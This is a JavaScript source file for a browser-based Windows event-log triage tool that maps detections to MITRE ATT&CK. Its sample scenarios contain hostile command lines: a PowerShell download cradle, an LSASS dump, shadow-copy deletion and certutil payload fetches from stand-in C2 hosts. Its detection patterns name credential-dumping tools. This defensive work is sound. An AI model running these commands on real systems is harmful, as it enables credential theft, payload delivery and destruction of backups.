/* Client-side DFIR triage engine & UI for win-event-triage.
 * Runs 100% locally in browser or under Node.js for tests. */

(function (root, factory) {
  const api = factory();
  if (typeof module !== "undefined" && module.exports) {
    module.exports = api;
  } else {
    root.WinEventTriageWeb = api;
  }
})(typeof globalThis !== "undefined" ? globalThis : this, function () {
  "use strict";

  const RULES = {
    WET001: { sev: "high", tactic: "Credential Access", tech: "T1110.001", en: "Brute-force or password spraying burst (4625)", pt: "Rajada de forca bruta ou password spray (4625)", rem_en: "Block source IP at perimeter firewall and enable Smart Lockout.", rem_pt: "Bloqueie o IP de origem no firewall e ative Smart Lockout." },
    WET002: { sev: "critical", tactic: "Credential Access", tech: "T1110", en: "Brute-force burst followed by logon success (4625 -> 4624)", pt: "Forca bruta seguida de logon aceito (4625 -> 4624)", rem_en: "Assume compromise: revoke Kerberos TGTs, force password reset, verify MFA.", rem_pt: "Trate como comprometimento: derrube sessoes/TGTs, troque a senha e valide MFA." },
    WET003: { sev: "critical", tactic: "Credential Access", tech: "T1558.003", en: "Kerberoasting RC4 ticket request (4769 0x17)", pt: "Kerberoasting com cifra RC4 fraca (4769 0x17)", rem_en: "Rotate affected service password (25+ chars / gMSA) and enforce AES Kerberos.", rem_pt: "Rotacione a senha da conta de servico para gMSA ou 25+ caracteres." },
    WET004: { sev: "high", tactic: "Credential Access", tech: "T1110", en: "Account lockout storm (Event 4740)", pt: "Onda de bloqueios de conta (Evento 4740)", rem_en: "Inspect Caller Computer Name in Event 4740 and isolate source machine.", rem_pt: "Verifique o Caller Computer Name no evento 4740 e isole a origem." },
    WET005: { sev: "critical", tactic: "Credential Access", tech: "T1003.001", en: "Credential dumping / LSASS / NTDS indicator", pt: "Indicador de dump de credenciais (LSASS / NTDS)", rem_en: "Isolate endpoint immediately, enable RunAsPPL / Credential Guard, rotate krbtgt.", rem_pt: "Isole a maquina imediatamente, ative Credential Guard e rotacione krbtgt." },
    WET006: { sev: "critical", tactic: "Persistence", tech: "T1098", en: "Privileged security group modified (4728/4732/4756)", pt: "Alteracao em grupo privilegiado (4728/4732/4756)", rem_en: "Remove unauthorized members and audit executor logon session.", rem_pt: "Remova membros nao autorizados e audite a conta executora." },
    WET007: { sev: "high", tactic: "Persistence", tech: "T1136", en: "New account created off-hours or elevated quickly (4720)", pt: "Conta nova criada fora de hora ou elevada (4720)", rem_en: "Disable unapproved account and inspect creator session.", rem_pt: "Desative a conta nao aprovada e revise a sessao criadora." },
    WET008: { sev: "high", tactic: "Persistence", tech: "T1543.003", en: "Suspicious Windows service installed (7045/4697)", pt: "Servico suspeito instalado no Windows (7045/4697)", rem_en: "Stop service, collect binary SHA-256 hash, quarantine host.", rem_pt: "Pare o servico, colete o hash SHA-256 do binario e isole o servidor." },
    WET009: { sev: "high", tactic: "Persistence", tech: "T1053.005", en: "Suspicious scheduled task persistence (4698/4702/106)", pt: "Persistencia via Tarefa Agendada suspeita (4698)", rem_en: "Export task XML definition and delete unauthorized persistence triggers.", rem_pt: "Exporte o XML da tarefa e exclua triggers nao autorizados." },
    WET010: { sev: "critical", tactic: "Defense Evasion", tech: "T1070.001", en: "Windows audit log cleared (1102/104)", pt: "Log de auditoria apagado (1102/104)", rem_en: "Investigate Event 1102 subject and ship logs to external SIEM.", rem_pt: "Investigue o autor no evento 1102 e envie logs para SIEM externo." },
    WET011: { sev: "critical", tactic: "Impact", tech: "T1490", en: "Shadow copy deletion / recovery sabotage", pt: "Exclusao de Shadow Copies / sabotagem de recuperacao", rem_en: "Disconnect host from SMB/AD immediately and verify offline backups.", rem_pt: "Desconecte o host da rede SMB/AD e valide backups offline." },
    WET012: { sev: "critical", tactic: "Defense Evasion", tech: "T1562.001", en: "Microsoft Defender disabled or malware alert", pt: "Microsoft Defender desativado ou alerta de malware", rem_en: "Re-enable Tamper Protection via GPO/MDM and quarantine host.", rem_pt: "Reative Tamper Protection via GPO/MDM e isole o endpoint." },
    WET013: { sev: "high", tactic: "Defense Evasion", tech: "T1562.002", en: "Windows audit policy modified (4719)", pt: "Politica de auditoria modificada (4719)", rem_en: "Restore baseline GPO audit policy settings.", rem_pt: "Reaplique a GPO padrao de Auditoria Avancada." },
    WET014: { sev: "critical", tactic: "Execution", tech: "T1059.001", en: "Obfuscated / download-cradle PowerShell (4104/4688)", pt: "PowerShell ofuscado ou com download remoto", rem_en: "Decode Base64 script block and block outbound C2 destinations.", rem_pt: "Decodifique o bloco Base64 e bloqueie dominios C2." },
    WET015: { sev: "high", tactic: "Lateral Movement", tech: "T1021.001", en: "External RDP or explicit-credential lateral movement", pt: "Movimentacao lateral via RDP externo ou runas", rem_en: "Terminate session and restrict RDP behind NLA + MFA + bastion.", rem_pt: "Encerre a sessao e restrinja RDP atras de VPN/MFA." },
    WET016: { sev: "high", tactic: "Defense Evasion", tech: "T1218", en: "Living-off-the-Land binary (LOLBin) abuse", pt: "Abuso de binario nativo LOLBin (certutil/mshta)", rem_en: "Quarantine staged payload and enforce AppLocker/WDAC rules.", rem_pt: "Coloque o payload em quarentena e aplique regras WDAC." },
    WET017: { sev: "medium", tactic: "Initial Access", tech: "T1078", en: "Off-hours privileged logon (4672)", pt: "Logon administrativo fora do expediente (4672)", rem_en: "Confirm maintenance ticket; otherwise verify admin credentials.", rem_pt: "Confirme janela de manutencao aprovada ou audite a sessao." },
    WET018: { sev: "critical", tactic: "Credential Access", tech: "T1003.006", en: "Potential DCSync replication abuse (4662)", pt: "Possivel ataque DCSync / replicacao AD indevida (4662)", rem_en: "Tier-0 alert: revoke replication permissions and double-rotate krbtgt.", rem_pt: "Alerta Tier-0: revogue replicacao indevida e rotacione krbtgt duas vezes." }
  };

  const SEV_WEIGHT = { critical: 25, high: 14, medium: 6, low: 2 };
  const SEV_RANK = { critical: 4, high: 3, medium: 2, low: 1 };

  const I18N = {
    en: {
      hero_sub: "Read-only Windows Security, System, PowerShell & Defender event triage mapped to MITRE ATT&CK.",
      privacy_banner: "Zero upload: Event Viewer XML and JSON log snapshots are analyzed strictly inside your browser tab.",
      presets_label: "Load scenario:",
      preset_ransom: "Ransomware Intrusion Chain",
      preset_insider: "Insider & DCSync Escalation",
      preset_clean: "Clean AD Baseline",
      btn_upload: "Upload JSON / Event Viewer XML",
      btn_theme: "Theme",
      kpi_risk: "Incident Risk Score",
      kpi_events: "Events Analyzed",
      sev_critical: "Critical",
      sev_high: "High",
      sev_medium: "Medium",
      tab_findings: "Findings & Timeline",
      tab_mitre: "MITRE ATT&CK Coverage",
      tab_playbook: "Containment Playbook",
      findings_heading: "Detected Indicators",
      filter_all: "All",
      mitre_heading: "Triggered MITRE ATT&CK Tactics & Techniques",
      playbook_heading: "Prioritized First-Responder Containment Steps",
      clean_msg: "Clean baseline: zero suspicious Windows event indicators detected."
    },
    pt: {
      hero_sub: "Triagem somente leitura de logs Windows Security, System, PowerShell e Defender mapeada ao MITRE ATT&CK.",
      privacy_banner: "Zero envio externo: snapshots JSON e XML do Visualizador de Eventos sao analisados apenas nesta aba.",
      presets_label: "Carregar cenario:",
      preset_ransom: "Cadeia de Ransomware",
      preset_insider: "Escalacao Interna & DCSync",
      preset_clean: "Baseline Limpo de AD",
      btn_upload: "Carregar JSON / XML de Eventos",
      btn_theme: "Tema",
      kpi_risk: "Risco do Incidente",
      kpi_events: "Eventos Analisados",
      sev_critical: "Critico",
      sev_high: "Alto",
      sev_medium: "Medio",
      tab_findings: "Alertas e Linha do Tempo",
      tab_mitre: "Cobertura MITRE ATT&CK",
      tab_playbook: "Playbook de Contencao",
      findings_heading: "Indicadores Detectados",
      filter_all: "Todos",
      mitre_heading: "Taticas e Tecnicas MITRE ATT&CK Acionadas",
      playbook_heading: "Ordem Prioritaria de Contencao",
      clean_msg: "Baseline limpo: nenhum indicador suspeito detectado nos logs."
    }
  };

  const PRESETS = {
    ransomware: {
      label: "ransomware-intrusion.json",
      events: [
        { EventId: 4625, TimeCreated: "2026-11-25T02:10:01Z", Computer: "SRV-APP01.contoso.lab", Data: { TargetUserName: "svc-backup", IpAddress: "198.51.100.44" } },
        { EventId: 4625, TimeCreated: "2026-11-25T02:10:15Z", Computer: "SRV-APP01.contoso.lab", Data: { TargetUserName: "svc-backup", IpAddress: "198.51.100.44" } },
        { EventId: 4625, TimeCreated: "2026-11-25T02:10:28Z", Computer: "SRV-APP01.contoso.lab", Data: { TargetUserName: "adm-tier1", IpAddress: "198.51.100.44" } },
        { EventId: 4625, TimeCreated: "2026-11-25T02:10:42Z", Computer: "SRV-APP01.contoso.lab", Data: { TargetUserName: "adm-tier1", IpAddress: "198.51.100.44" } },
        { EventId: 4625, TimeCreated: "2026-11-25T02:11:05Z", Computer: "SRV-APP01.contoso.lab", Data: { TargetUserName: "adm-tier1", IpAddress: "198.51.100.44" } },
        { EventId: 4624, TimeCreated: "2026-11-25T02:12:30Z", Computer: "SRV-APP01.contoso.lab", Data: { TargetUserName: "adm-tier1", LogonType: "10", IpAddress: "198.51.100.44" } },
        { EventId: 4672, TimeCreated: "2026-11-25T02:12:31Z", Computer: "SRV-APP01.contoso.lab", Data: { SubjectUserName: "adm-tier1" } },
        { EventId: 4769, TimeCreated: "2026-11-25T02:14:00Z", Computer: "DC01.contoso.lab", Data: { TargetUserName: "adm-tier1", ServiceName: "MSSQLSvc/SRV-SQL01.contoso.lab:1433", TicketEncryptionType: "0x17", IpAddress: "10.20.1.50" } },
        { EventId: 4104, TimeCreated: "2026-11-25T02:15:10Z", Computer: "SRV-APP01.contoso.lab", Data: { SubjectUserName: "adm-tier1", ScriptBlockText: "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.invalid/stage2.ps1'); powershell -enc JABhAD0AMQAyADMA" } },
        { EventId: 4688, TimeCreated: "2026-11-25T02:16:00Z", Computer: "SRV-APP01.contoso.lab", Data: { SubjectUserName: "adm-tier1", CommandLine: "procdump64.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp" } },
        { EventId: 7045, TimeCreated: "2026-11-25T02:17:20Z", Computer: "SRV-APP01.contoso.lab", Data: { ServiceName: "WinSyncHelper", ImagePath: "cmd.exe /c C:\\ProgramData\\payload.exe" } },
        { EventId: 5001, TimeCreated: "2026-11-25T02:18:00Z", Computer: "SRV-APP01.contoso.lab", Message: "Microsoft Defender real-time protection disabled." },
        { EventId: 4688, TimeCreated: "2026-11-25T02:19:00Z", Computer: "SRV-APP01.contoso.lab", Data: { SubjectUserName: "SYSTEM", CommandLine: "vssadmin.exe delete shadows /all /quiet" } },
        { EventId: 1102, TimeCreated: "2026-11-25T02:20:10Z", Computer: "SRV-APP01.contoso.lab", Data: { SubjectUserName: "adm-tier1" }, Message: "The audit log was cleared." }
      ]
    },
    insider: {
      label: "insider-lateral-movement.json",
      events: [
        { EventId: 4740, TimeCreated: "2026-11-25T04:01:00Z", Computer: "DC01.contoso.lab", Data: { TargetUserName: "fin-analyst01" } },
        { EventId: 4740, TimeCreated: "2026-11-25T04:01:12Z", Computer: "DC01.contoso.lab", Data: { TargetUserName: "fin-analyst02" } },
        { EventId: 4740, TimeCreated: "2026-11-25T04:01:25Z", Computer: "DC01.contoso.lab", Data: { TargetUserName: "fin-analyst03" } },
        { EventId: 4720, TimeCreated: "2026-11-25T04:05:00Z", Computer: "DC01.contoso.lab", Data: { TargetUserName: "svc-audit-temp", SubjectUserName: "ops-sec01" } },
        { EventId: 4728, TimeCreated: "2026-11-25T04:06:00Z", Computer: "DC01.contoso.lab", Data: { TargetUserName: "Domain Admins", MemberName: "CN=svc-audit-temp,OU=Service,DC=contoso,DC=lab", SubjectUserName: "ops-sec01" } },
        { EventId: 4648, TimeCreated: "2026-11-25T04:07:30Z", Computer: "SRV-FILE02.contoso.lab", Data: { SubjectUserName: "ops-sec01", TargetUserName: "svc-audit-temp", TargetServerName: "DC01.contoso.lab" } },
        { EventId: 4698, TimeCreated: "2026-11-25T04:08:15Z", Computer: "DC01.contoso.lab", Data: { SubjectUserName: "svc-audit-temp", TaskName: "\\Microsoft\\Windows\\UpdateCheck", TaskContent: "C:\\Users\\Public\\sync.bat && certutil -urlcache -split -f https://c2.example.invalid/r.exe" } },
        { EventId: 4688, TimeCreated: "2026-11-25T04:09:00Z", Computer: "DC01.contoso.lab", Data: { SubjectUserName: "svc-audit-temp", CommandLine: "certutil.exe -urlcache -split -f https://c2.example.invalid/a.dll C:\\ProgramData\\a.dll" } },
        { EventId: 4719, TimeCreated: "2026-11-25T04:10:00Z", Computer: "DC01.contoso.lab", Data: { SubjectUserName: "svc-audit-temp" } },
        { EventId: 4662, TimeCreated: "2026-11-25T04:11:00Z", Computer: "DC01.contoso.lab", Data: { SubjectUserName: "svc-audit-temp", Properties: "Replicating Directory Changes {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}" } }
      ]
    },
    clean: {
      label: "clean-baseline.json",
      events: [
        { EventId: 4624, TimeCreated: "2026-11-25T13:15:00Z", Computer: "SRV-WEB01.contoso.lab", Data: { TargetUserName: "adm-gabriel", LogonType: "10", IpAddress: "10.20.4.18" } },
        { EventId: 4672, TimeCreated: "2026-11-25T13:15:01Z", Computer: "SRV-WEB01.contoso.lab", Data: { SubjectUserName: "adm-gabriel" } },
        { EventId: 4769, TimeCreated: "2026-11-25T14:20:00Z", Computer: "DC01.contoso.lab", Data: { TargetUserName: "app-reader", ServiceName: "HTTP/api.contoso.lab", TicketEncryptionType: "0x12", IpAddress: "10.20.2.10" } },
        { EventId: 4688, TimeCreated: "2026-11-25T16:10:00Z", Computer: "SRV-WEB01.contoso.lab", Data: { SubjectUserName: "SYSTEM", CommandLine: "C:\\Windows\\System32\\svchost.exe -k netsvcs" } }
      ]
    }
  };

  function isPrivateIp(ip) {
    const s = String(ip || "").trim();
    if (!s || s === "-" || s === "127.0.0.1" || s === "::1" || s === "localhost") return true;
    if (/^10\.|^192\.168\.|^169\.254\./.test(s)) return true;
    return /^172\.(1[6-9]|2\d|3[01])\./.test(s);
  }

  function parseXmlEventsString(xmlText) {
    const events = [];
    const blockRx = /<Event\b[^>]*>([\s\S]*?)<\/Event>/gi;
    let m;
    while ((m = blockRx.exec(xmlText)) !== null) {
      const body = m[1];
      const eidMatch = /<EventID[^>]*>(\d+)<\/EventID>/i.exec(body);
      const timeMatch = /<TimeCreated[^>]*SystemTime=["']([^"']+)["']/i.exec(body);
      const compMatch = /<Computer[^>]*>([^<]+)<\/Computer>/i.exec(body);
      const data = {};
      const dataRx = /<Data\s+Name=["']([^"']+)["'][^>]*>([\s\S]*?)<\/Data>/gi;
      let dm;
      while ((dm = dataRx.exec(body)) !== null) {
        data[dm[1]] = dm[2];
      }
      events.push({
        EventId: eidMatch ? Number(eidMatch[1]) : 0,
        TimeCreated: timeMatch ? timeMatch[1] : "",
        Computer: compMatch ? compMatch[1] : "unknown-host",
        Message: "",
        Data: data
      });
    }
    return events;
  }

  function analyzeEvents(rawEvents, sourceLabel = "snapshot") {
    const ordered = (rawEvents || []).slice().sort((a, b) => Date.parse(a.TimeCreated || 0) - Date.parse(b.TimeCreated || 0));
    const findings = [];

    const add = (ruleId, ts, host, acct, ip, evidence) => {
      const r = RULES[ruleId];
      findings.push({ rule_id: ruleId, severity: r.sev, tactic: r.tactic, technique: r.tech, timestamp: ts || "", computer: host || "-", account: acct || "-", source_ip: ip || "-", evidence });
    };

    const failedByIp = new Map();
    ordered.forEach((ev) => {
      if (Number(ev.EventId) === 4625) {
        const ip = String((ev.Data && ev.Data.IpAddress) || "-");
        if (!failedByIp.has(ip)) failedByIp.set(ip, []);
        failedByIp.get(ip).push(ev);
      }
    });

    failedByIp.forEach((grp, ip) => {
      if (grp.length >= 5) {
        const mins = (Date.parse(grp[grp.length - 1].TimeCreated) - Date.parse(grp[0].TimeCreated)) / 60000;
        if (mins <= 15) {
          const users = [...new Set(grp.map((x) => (x.Data && x.Data.TargetUserName) || "unknown"))];
          add("WET001", grp[grp.length - 1].TimeCreated, grp[0].Computer, users.join(","), ip, `${grp.length} failed logons (4625) from ${ip} targeting: ${users.join(", ")}`);
        }
      }
    });

    ordered.forEach((ev) => {
      if (Number(ev.EventId) === 4624 && ev.Data && ev.Data.IpAddress && failedByIp.has(ev.Data.IpAddress)) {
        const tOk = Date.parse(ev.TimeCreated);
        const prior = failedByIp.get(ev.Data.IpAddress).filter((f) => {
          const d = (tOk - Date.parse(f.TimeCreated)) / 60000;
          return d >= 0 && d <= 15;
        });
        if (prior.length >= 3) {
          add("WET002", ev.TimeCreated, ev.Computer, ev.Data.TargetUserName, ev.Data.IpAddress, `Successful logon for '${ev.Data.TargetUserName}' from ${ev.Data.IpAddress} after ${prior.length} failures.`);
        }
      }
    });

    const created = new Set();
    const lockouts = ordered.filter((e) => Number(e.EventId) === 4740);
    if (lockouts.length >= 3) {
      const names = [...new Set(lockouts.map((e) => (e.Data && e.Data.TargetUserName) || "user"))];
      add("WET004", lockouts[lockouts.length - 1].TimeCreated, lockouts[0].Computer, names.join(","), "-", `${lockouts.length} account lockouts (4740): ${names.join(", ")}`);
    }

    const privGroups = new Set(["domain admins", "enterprise admins", "schema admins", "administrators", "backup operators", "remote desktop users"]);

    ordered.forEach((ev) => {
      const eid = Number(ev.EventId);
      const d = ev.Data || {};
      const cmd = `${d.CommandLine || ""} ${d.ScriptBlockText || ""} ${ev.Message || ""}`.trim();
      const dt = new Date(ev.TimeCreated || 0);
      const hour = dt.getUTCHours();

      if (eid === 4720 && d.TargetUserName) {
        created.add(String(d.TargetUserName).toLowerCase());
        if (hour < 7 || hour >= 20) add("WET007", ev.TimeCreated, ev.Computer, d.TargetUserName, "-", `User '${d.TargetUserName}' created off-hours by '${d.SubjectUserName || "unknown"}'.`);
      }
      if (eid === 4769 && d.TicketEncryptionType === "0x17" && d.ServiceName && !String(d.ServiceName).endsWith("$") && !/^krbtgt/i.test(d.ServiceName)) {
        add("WET003", ev.TimeCreated, ev.Computer, d.TargetUserName, d.IpAddress || "-", `RC4 TGS 4769 requested for SPN '${d.ServiceName}'.`);
      }
      if ([4656, 4663, 4688, 4104].includes(eid) && (/lsass\.exe/i.test(d.ObjectName || "") || /(sekurlsa|comsvcs\.dll.*minidump|procdump.*lsass|ntdsutil.*ifm)/i.test(cmd))) {
        add("WET005", ev.TimeCreated, ev.Computer, d.SubjectUserName || "unknown", "-", `Credential dump indicator: ${cmd.slice(0, 110)}`);
      }
      if ([4728, 4732, 4756].includes(eid)) {
        const grp = String(d.TargetUserName || "");
        const mem = String(d.MemberName || "unknown");
        if (privGroups.has(grp.toLowerCase())) add("WET006", ev.TimeCreated, ev.Computer, mem, "-", `'${mem}' added to '${grp}' by '${d.SubjectUserName || "unknown"}'.`);
        const cn = mem.replace(/^CN=([^,]+),.*$/i, "$1").toLowerCase();
        if (created.has(cn)) add("WET007", ev.TimeCreated, ev.Computer, mem, "-", `Newly created '${mem}' elevated into '${grp}'.`);
      }
      if ([7045, 4697].includes(eid) && /(\\Temp\\|\\AppData\\|\\Users\\Public\\|\\ProgramData\\|cmd\.exe\s+\/c|powershell.*-enc|PSEXESVC)/i.test(d.ImagePath || "")) {
        add("WET008", ev.TimeCreated, ev.Computer, "SYSTEM", "-", `Suspicious service '${d.ServiceName}' installed: ${d.ImagePath}`);
      }
      if ([4698, 4702, 106].includes(eid) && /(\\Temp\\|\\AppData\\|\\ProgramData\\|-enc|EncodedCommand|powershell|mshta|certutil)/i.test(`${d.TaskContent || ""} ${ev.Message || ""}`)) {
        add("WET009", ev.TimeCreated, ev.Computer, d.SubjectUserName || "unknown", "-", `Suspicious scheduled task '${d.TaskName || "unknown"}'.`);
      }
      if ([1102, 104].includes(eid)) add("WET010", ev.TimeCreated, ev.Computer, d.SubjectUserName || "unknown", "-", `Event log cleared (EventID ${eid}) by '${d.SubjectUserName || "unknown"}'.`);
      if ([4688, 4104].includes(eid) && /(vssadmin(?:\.exe)?\s+delete\s+shadows|wmic(?:\.exe)?\s+shadowcopy\s+delete|wbadmin(?:\.exe)?\s+delete|bcdedit.*recoveryenabled\s+no)/i.test(cmd)) {
        add("WET011", ev.TimeCreated, ev.Computer, d.SubjectUserName || "SYSTEM", "-", `Shadow copy/recovery sabotage: ${cmd.slice(0, 110)}`);
      }
      if ([5001, 5007, 1116, 1117].includes(eid)) add("WET012", ev.TimeCreated, ev.Computer, "Defender", "-", `Defender alert/tamper EventID ${eid}: ${ev.Message || ""}`);
      if (eid === 4719) add("WET013", ev.TimeCreated, ev.Computer, d.SubjectUserName || "unknown", "-", `Audit policy modified by '${d.SubjectUserName || "unknown"}'.`);
      if ([4104, 4688].includes(eid) && /(-(enc|encodedcommand)\s+[A-Za-z0-9+/=]{12,}|FromBase64String|Invoke-Expression|\bIEX\b|DownloadString|Net\.WebClient|AmsiUtils)/i.test(cmd)) {
        add("WET014", ev.TimeCreated, ev.Computer, d.SubjectUserName || "unknown", "-", `Suspicious PowerShell: ${cmd.slice(0, 110)}`);
      }
      if (eid === 4624 && String(d.LogonType) === "10" && !isPrivateIp(d.IpAddress)) {
        add("WET015", ev.TimeCreated, ev.Computer, d.TargetUserName, d.IpAddress, `External RDP logon from ${d.IpAddress}.`);
      }
      if (eid === 4648 && d.SubjectUserName && !String(d.SubjectUserName).endsWith("$")) {
        add("WET015", ev.TimeCreated, ev.Computer, d.SubjectUserName, "-", `Explicit credentials (4648) -> '${d.TargetUserName}' on '${d.TargetServerName}'.`);
      }
      if (eid === 4688 && /(certutil.*-urlcache|mshta(?:\.exe)?\s+https?:\/\/|bitsadmin.*\/transfer|regsvr32.*\/i:https?:\/\/|wmic\s+\/node:)/i.test(cmd)) {
        add("WET016", ev.TimeCreated, ev.Computer, d.SubjectUserName || "unknown", "-", `LOLBin abuse: ${cmd.slice(0, 110)}`);
      }
      if (eid === 4672 && d.SubjectUserName && !String(d.SubjectUserName).endsWith("$") && !/^(SYSTEM|LOCAL SERVICE|NETWORK SERVICE)$/i.test(d.SubjectUserName) && (hour < 7 || hour >= 20)) {
        add("WET017", ev.TimeCreated, ev.Computer, d.SubjectUserName, "-", `Off-hours privileged logon (4672) at ${String(hour).padStart(2, "0")}:xx UTC.`);
      }
      if (eid === 4662 && /1131f6a[ad]-9c07-11d1-f79f-00c04fc2dcd2/i.test(d.Properties || "") && d.SubjectUserName && !String(d.SubjectUserName).endsWith("$")) {
        add("WET018", ev.TimeCreated, ev.Computer, d.SubjectUserName, "-", `DS-Replication-Get-Changes by non-DC account '${d.SubjectUserName}'.`);
      }
    });

    findings.sort((a, b) => (SEV_RANK[b.severity] - SEV_RANK[a.severity]) || a.timestamp.localeCompare(b.timestamp));
    const counts = { critical: 0, high: 0, medium: 0, low: 0 };
    findings.forEach((f) => { counts[f.severity]++; });
    const riskScore = Math.min(100, findings.reduce((acc, f) => acc + SEV_WEIGHT[f.severity], 0));
    return { source: sourceLabel, events_analyzed: ordered.length, risk_score: riskScore, counts, findings };
  }

  if (typeof document !== "undefined") {
    let lang = "en";
    let theme = "dark";
    let sevFilter = "all";
    let report = analyzeEvents(PRESETS.ransomware.events, PRESETS.ransomware.label);

    const el = (id) => document.getElementById(id);
    const esc = (s) => String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");

    const renderAll = () => {
      document.documentElement.lang = lang;
      el("lang-toggle").textContent = lang === "en" ? "PT-BR" : "EN";
      document.querySelectorAll("[data-i18n]").forEach((n) => {
        const k = n.getAttribute("data-i18n");
        if (I18N[lang][k]) n.textContent = I18N[lang][k];
      });
      el("kpi-score").textContent = `${report.risk_score}/100`;
      el("kpi-events").textContent = String(report.events_analyzed);
      el("kpi-crit").textContent = String(report.counts.critical);
      el("kpi-high").textContent = String(report.counts.high);
      el("kpi-med").textContent = String(report.counts.medium);

      const visible = report.findings.filter((f) => sevFilter === "all" || f.severity === sevFilter);
      const list = el("findings-list");
      list.innerHTML = visible.length
        ? visible.map((f) => {
            const meta = RULES[f.rule_id];
            return `
              <article class="finding-item sev-${esc(f.severity)}">
                <div class="finding-top"><span>${esc(f.rule_id)} - ${esc(lang === "pt" ? meta.pt : meta.en)}</span><span>${esc(f.severity.toUpperCase())}</span></div>
                <div class="finding-meta">${esc(f.tactic)} (${esc(f.technique)}) | ${esc(f.timestamp)} | ${esc(f.computer)} | ${esc(f.account)}</div>
                <code class="finding-ev">${esc(f.evidence)}</code>
                <div class="finding-rem">${esc(lang === "pt" ? meta.rem_pt : meta.rem_en)}</div>
              </article>
            `;
          }).join("")
        : `<div class="clean-empty">${esc(I18N[lang].clean_msg)}</div>`;

      const tactics = new Map();
      report.findings.forEach((f) => {
        if (!tactics.has(f.tactic)) tactics.set(f.tactic, new Set());
        tactics.get(f.tactic).add(`${f.technique} (${f.rule_id})`);
      });
      el("mitre-grid").innerHTML = tactics.size
        ? Array.from(tactics.entries()).map(([tac, techs]) => `<div class="mitre-card"><h3>${esc(tac)}</h3><div>${Array.from(techs).map((t) => `<code>${esc(t)}</code>`).join(" ")}</div></div>`).join("")
        : `<div class="clean-empty">${esc(I18N[lang].clean_msg)}</div>`;

      const uniqueRules = [...new Set(report.findings.map((f) => f.rule_id))];
      el("playbook-list").innerHTML = uniqueRules.length
        ? uniqueRules.map((rid) => `<li><strong>${rid}:</strong> ${esc(lang === "pt" ? RULES[rid].rem_pt : RULES[rid].rem_en)}</li>`).join("")
        : `<li>${esc(I18N[lang].clean_msg)}</li>`;
    };

    const download = (name, mime, content) => {
      const blob = new Blob([content], { type: mime });
      const a = document.createElement("a");
      a.href = URL.createObjectURL(blob);
      a.download = name;
      a.click();
      setTimeout(() => URL.revokeObjectURL(a.href), 1000);
    };

    const init = () => {
      const switchTab = (name) => {
        ["findings", "mitre", "playbook"].forEach((t) => {
          const active = t === name;
          el("tab-" + t).classList.toggle("active", active);
          el("panel-" + t).hidden = !active;
        });
      };
      el("tab-findings").addEventListener("click", () => switchTab("findings"));
      el("tab-mitre").addEventListener("click", () => switchTab("mitre"));
      el("tab-playbook").addEventListener("click", () => switchTab("playbook"));

      el("lang-toggle").addEventListener("click", () => { lang = lang === "en" ? "pt" : "en"; renderAll(); });
      el("theme-toggle").addEventListener("click", () => {
        theme = theme === "dark" ? "light" : "dark";
        document.documentElement.setAttribute("data-theme", theme);
      });

      document.querySelectorAll("[data-preset]").forEach((btn) => {
        btn.addEventListener("click", () => {
          const p = PRESETS[btn.getAttribute("data-preset")];
          report = analyzeEvents(p.events, p.label);
          renderAll();
        });
      });

      document.querySelectorAll("[data-filter]").forEach((btn) => {
        btn.addEventListener("click", () => {
          sevFilter = btn.getAttribute("data-filter");
          document.querySelectorAll("[data-filter]").forEach((b) => b.classList.remove("active"));
          btn.classList.add("active");
          renderAll();
        });
      });

      el("file-input").addEventListener("change", (ev) => {
        const f = ev.target.files && ev.target.files[0];
        if (!f) return;
        const r = new FileReader();
        r.onload = () => {
          const text = String(r.result || "");
          let events = [];
          if (f.name.toLowerCase().endsWith(".xml") || text.trim().startsWith("<")) {
            events = parseXmlEventsString(text);
          } else {
            const parsed = JSON.parse(text);
            events = Array.isArray(parsed) ? parsed : (parsed.events || []);
          }
          report = analyzeEvents(events, f.name);
          renderAll();
        };
        r.readAsText(f);
      });

      el("btn-export-json").addEventListener("click", () => download("triage-report.json", "application/json", JSON.stringify(report, null, 2)));
      el("btn-export-csv").addEventListener("click", () => {
        const rows = [["RuleId", "Severity", "Tactic", "Technique", "Timestamp", "Computer", "Account", "Evidence"].join(",")].concat(
          report.findings.map((f) => [f.rule_id, f.severity, f.tactic, f.technique, f.timestamp, f.computer, f.account, `"${String(f.evidence).replace(/"/g, '""')}"`].join(","))
        );
        download("triage-report.csv", "text/csv", rows.join("\n"));
      });
      el("btn-export-md").addEventListener("click", () => {
        const md = [`# win-event-triage Report (${report.risk_score}/100)`, ...report.findings.map((f) => `- **[${f.severity.toUpperCase()}] ${f.rule_id} (${f.technique})** ${f.evidence}`)].join("\n");
        download("triage-report.md", "text/markdown", md);
      });
      el("btn-export-html").addEventListener("click", () => {
        download("triage-report.html", "text/html", `<!DOCTYPE html><html><head><meta charset="utf-8"><title>win-event-triage</title></head><body><h1>Risk ${report.risk_score}/100</h1><pre>${esc(JSON.stringify(report, null, 2))}</pre></body></html>`);
      });

      renderAll();
    };

    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", init);
    } else {
      init();
    }
  }

  return { RULES, PRESETS, analyzeEvents, parseXmlEventsString };
});
